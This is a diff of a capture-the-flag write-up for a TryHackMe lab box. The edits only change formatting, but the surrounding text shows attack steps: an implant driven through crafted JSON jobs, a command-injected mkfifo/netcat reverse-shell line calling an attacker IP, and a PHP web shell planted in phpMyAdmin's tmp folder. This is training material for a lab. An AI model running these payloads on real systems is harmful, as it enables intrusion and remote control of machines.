@@ -66,10 +66,11 @@ We're receiving an HTTP GET call to a `heartbeat` endpoint and a long filename t
   "success": false
 }
 ```
+{: .nolineno }
 
 Let's start an HTTP server so that we can respond to the GET. 
 
-```console
+```bash
 ┌──(user㉿kali-linux-2022-2)-[~]
 └─$ python -m http.server 81
 Serving HTTP on 0.0.0.0 port 81 (http://0.0.0.0:81/) ...
@@ -82,6 +83,7 @@ Serving HTTP on 0.0.0.0 port 81 (http://0.0.0.0:81/) ...
 10.10.115.84 - - [02/Aug/2023 17:17:03] code 404, message File not found                                        
 10.10.115.84 - - [02/Aug/2023 17:17:03] "GET /get-job/ImxhdGVzdCI= HTTP/1.1" 404 -
 ```
+{: .nolineno }
 
 Soon after starting the server we see calls coming in for the  `heartbeat` endponit as well as a new one to `get-job`. The filename at the end of the `get-job` endponit decodes to `"latest"`, suggesting we can provide new job instructions here. 
 
@@ -96,16 +98,19 @@ To begin interacting with the box, we'll host a file at `/get-job/ImxhdGVzdCI=` 
 ┌──(user㉿kali-linux-2022-2)-[~]
 └─$ echo 'ls' > get-job/ImxhdGVzdCI=
 ```
+{: .nolineno }
 After a brief wait we see the implant call our file, followed by a second call to a new endpoint `job-result`!
 
 ```bash
 10.10.115.84 - - [02/Aug/2023 17:31:02] "GET /job-result/eyJzdWNjZXNzIjogZmFsc2UsICJyZXN1bHQiOiAiRW5jb2RpbmcgZXJyb3IifQ==
 ```
+{: .nolineno }
 
 Decoding the base 64 we see 
 ```json
 {"success": false, "result": "Encoding error"}
 ```
+{: .nolineno }
 
 OK, so it wants the payload back in base 64 as well. On the next round we'll encode the payload:
 
@@ -116,6 +121,7 @@ The implant reads this and returns:
 ```json
 {"success": false, "result": "JSON error"}
 ```
+{: .nolineno }
 
 Now it wants JSON. At least we're moving forward! Let’s try the JSON format we received in the heartbeat message. 
 
@@ -128,6 +134,7 @@ We receive:
 ```json
 {"job_id": 0, "cmd": "ls", "success": true, "result": "products.py\nuser.txt\n"}
 ```
+{: .nolineno }
 
 We've achieved RCE and found the first flag already, *let's grab it right now!*
 
@@ -140,6 +147,7 @@ Receive:
 ```json
 {"job_id": 0, "cmd": "cat user.txt", "success": true, "result": "THM{[redacted]}\n"}
 ```
+{: .nolineno }
 
 ## Initial Shell
 
@@ -148,7 +156,7 @@ Some of the more popular shells don’t seem to work on this box but eventually 
 ```json
 {"job_id": 0, "cmd": "127.0.0.1 && rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.61.1 4444 >/tmp/f"}
 ```
-
+{: .nolineno }
 
 
 
@@ -174,6 +182,7 @@ cursor.execute('SELECT * FROM products')
 for product in cursor.fetchall():
     print(f'We have {product[2]}x {product[1]}')
 ```
+{: .nolineno }
 
 We enumerate the database locally using the credentials here but find nothing interesting. The credentials also don't work to `sudo` or `su` to any of our other users. 
 
@@ -308,7 +317,7 @@ if __name__ == "__main__":
 
 Enumerating fi’s home directory we can see that he has `sudo` permissions. This looks like a good account to transition to if we can find a path. 
 
-```console
+```bash
 ada@forgottenimplant:/home/fi$ ls -la
 
 total 148
@@ -329,7 +338,7 @@ lrwxrwxrwx 1 fi   fi       9 Jul 10  2022 .python_history -> /dev/null
 drwx------ 2 fi   fi    4096 Jul 10  2022 .ssh
 -rw-r--r-- 1 fi   fi       0 Jul 10  2022 .sudo_as_admin_successful
 ```
-
+{: .nolineno }
 
 >#### 🐰 Rabbit Hole: Python Library Hijacking
 >There is a python file in fi's home named `sniffer.py`. This is the code that detected our `nmap` scan and started the implant callnig out to us. It would require elevated permissions to run the networknig libraries, and seeing it's log owned and wrtten to by root is a good indication that this would be a nice attack vector. Alas, it seems to be well secured from Python library hijacking and we aren't privy to the job launching it. 
@@ -364,6 +373,7 @@ Shellcodes: No Results
 ┌──(user㉿kali-linux-2022-2)-[~]
 └─$              
 ```
+{: .nolineno }
 
 Because this port isn't exposed externally, we'll have to either set up a reverse tunnel or attack locally on the box. For simplicity, we upload the exploit file and run it against localhost with the credentials that we found in ada's python file earlier. 
 ```console
@@ -380,7 +390,7 @@ In most challenges we’re trying to elevate *out* of the www-data account, lets
 
 Enumerating `/var/www/phpmyadmin` we see we can write to the `tmp` folder:
 
-```console
+```bash
 ada@forgottenimplant:/var/www/phpmyadmin$ ls -la
 
 total 908
@@ -404,6 +414,7 @@ drwxr-xr-x 25 www-data www-data   4096 Jul 12  2022 vendor
 -rw-rw-r--  1 www-data www-data  29031 May 25  2018 yarn.lock
 ada@forgottenimplant:/var/www/phpmyadmin$
 ```
+{: .nolineno }
 
 If we can access files in this directory through the web server we'll be able to run code as www-data. 
 
@@ -434,6 +445,7 @@ shell.php           100%[===================>]   5.36K  --.-KB/s    in 0.001s
 
 ada@forgottenimplant:/var/www/phpmyadmin/tmp$ curl 127.0.0.1/tmp/shell.php
 ```
+{: .nolineno }
 
 With the above we receive a connection back to our new listener as www-data.
 
